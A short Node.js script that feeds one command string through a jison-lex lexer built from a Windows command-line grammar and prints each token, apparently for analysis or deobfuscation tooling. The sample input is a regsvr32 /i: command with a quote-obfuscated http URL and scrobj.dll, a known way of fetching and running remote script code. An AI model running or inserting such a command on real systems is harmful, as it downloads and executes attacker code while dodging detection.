const JisonLex = require("jison-lex"),
      fs       = require("fs");

const grammar = fs.readFileSync(
    require.resolve("./comspec.l")
).toString();

const lexer = new JisonLex(grammar);

const code = `regsvr32.exe /s /n /u /i:”h”t”t”p://<REDACTED>.jpg scrobj.dll`;

lexer.setInput(code);

while (true) {
    let token = lexer.lex();
    console.log(token);

    if (token === "EOF") {
        break;
    }

}
